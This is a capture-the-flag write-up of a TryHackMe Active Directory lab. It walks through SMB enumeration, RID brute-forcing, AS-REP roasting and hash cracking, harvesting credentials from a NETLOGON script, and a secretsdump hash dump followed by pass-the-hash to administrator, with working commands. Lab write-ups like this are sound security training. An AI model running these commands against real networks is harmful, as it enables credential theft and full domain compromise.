# VulnNet: Roasted

Link to room: https://tryhackme.com/room/vulnnetroasted

### This is a Windows activie directory machine

Let's start with an nmap scan:

```python
# Nmap 7.91 scan initiated Sun May 16 16:34:12 2021 as: nmap -p- -v -sC -sV -Pn -oN nmap-all-ports vulnet.thm
Nmap scan report for vulnet.thm (10.10.123.68)
Host is up (0.23s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-16 21:04:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-16T21:05:40
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 16 17:06:24 2021 -- 1 IP address (1 host up) scanned in 1932.04 seconds
```

Based on some of the opened ports like 53(DNS) and 88(kerberos), we can predict this is a windows active directory machine

## SMB Enum

we can enumerate shares anonymously providing a null password using smbmap
```python
╭── /opt/share/tryhackme/vulnet  master ✘✘✘ ✭  
╰────▶ smbmap -H vulnet.thm -u guest -p ''
[+] IP: vulnet.thm:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous).
The IPC$ share hints us of the possibility to do anonymous user enumeration. We will come to that later. Let's access the last two shares and see what contents they have

```python
╭── /opt/share/tryhackme/vulnet/smb_loot  master ✘✘✘
╰────▶ smbclient //vulnet.thm/VulnNet-Business-Anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021


╭── /opt/share/tryhackme/vulnet/smb_loot  master ✘✘✘ ✭  
╰────▶ smbclient //vulnet.thm/VulnNet-Enterprise-Anonymous                           
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
```
##
Download all the contents onto our local machine
```
smb: \> mget *
```
##
We get potential usernames and other info from the downloaded files from smb. so let's build our username list. Spoiler alert!!, the usernames in the files were generic and didn't match with those created on the machine

Time to find a way to enumerate usernames on the box. i will be using rid-brute from crackmapexec
```python
crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser
```
Since anonymous login allowed, you can replace username robot with whatever name you like. I used robot because i am ROBOT -:)

![image](https://user-images.githubusercontent.com/68066436/118685539-3038aa80-b7d1-11eb-91e9-572fcd48794a.png)

##
Extract the usernames with RID greater than 1000 into a username file. I named my file users.txt with below usernames

```
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```
##
Try kerberoasting with the username file returns a hash for t-skid (Implies user t-skid does not require kerberos pre-authentication)

```python
python3 GetNPUsers.py -dc-ip 10.10.176.144 -usersfile users.txt vulnnet-rst.local/
```
![image](https://user-images.githubusercontent.com/68066436/118688670-41cf8180-b7d4-11eb-9917-96222176f67f.png)

Put whole hash (from $krb to end of hash) in a file and crack with john-the-ripper
```python
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting-hash
```
![image](https://user-images.githubusercontent.com/68066436/118689287-d1753000-b7d4-11eb-8b7f-869cfe676122.png)

Creds for t-skid
```
user: t-skid
pass: <redacted>
```

Try to access smb again with the new creds to see if we can elevate our access to some shares
```python
smbmap -H vulnet.thm -u t-skid -p '<redacted>'
```
![image](https://user-images.githubusercontent.com/68066436/118689875-77c13580-b7d5-11eb-88a7-c99bc26d771f.png)
Notice t-skid now has read access to NETLOGON and SYSVOL shares which we did not have with the anonymous logins

Let's access NETLOGON share with smbclient and see what we've got in there using t-skid's creds
```python
smbclient //vulnet.thm/NETLOGON -U t-skid
```
![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)

##
We get a new username and password after downloading and reading the content of ResetPassword.vbs
![image](https://user-images.githubusercontent.com/68066436/118691117-bf948c80-b7d6-11eb-9360-202d1f66c064.png)

Creds for a-whitehat
```
user: a-whitehat
pass: <redacted>
```

Pass a-whitehat's creds into evil-winrm to get the initial foothold into the machine
```python
evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
```
![image](https://user-images.githubusercontent.com/68066436/118693125-c45a4000-b7d8-11eb-9b0b-cf9abceba4aa.png)


## Privilege Escalation

Checked groups and realised user a-whitehat belong to the domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket

![image](https://user-images.githubusercontent.com/68066436/118693532-21ee8c80-b7d9-11eb-9b2d-195be8421d32.png)

Let's dump the hashes with secretsdump
```python
python3 secretsdump.py -just-dc a-whitehat:<redacted password>@vulnnet-rst.local
```
![image](https://user-images.githubusercontent.com/68066436/118694206-d2f52700-b7d9-11eb-9b00-698568e0e87f.png)

What do we do now that we have the administrator's hashes? Erhmmm, let's pass-the-hash using evil-winrm
```python
evil-winrm -i vulnet.thm -u administrator -H <redacted NTLM hash of administrator>
```
![image](https://user-images.githubusercontent.com/68066436/118695296-084e4480-b7db-11eb-8194-300f527f336b.png)

We have successfully escalated our privilege to administrator!!!!!


## Flags
Time to grab the flags

### User Flag:
Navigate to C:\users\enterprise-core-vn\Desktop\user.txt
![image](https://user-images.githubusercontent.com/68066436/118696979-d63de200-b7dc-11eb-8d86-a6da70a933aa.png)

### System Flag:
Navigate to C:\Users\Administrator\Desktop\system.txt
![image](https://user-images.githubusercontent.com/68066436/118696998-db029600-b7dc-11eb-8f7d-e0673173e282.png)



##
This is the end of my write-up, hope you enjoyed reading....



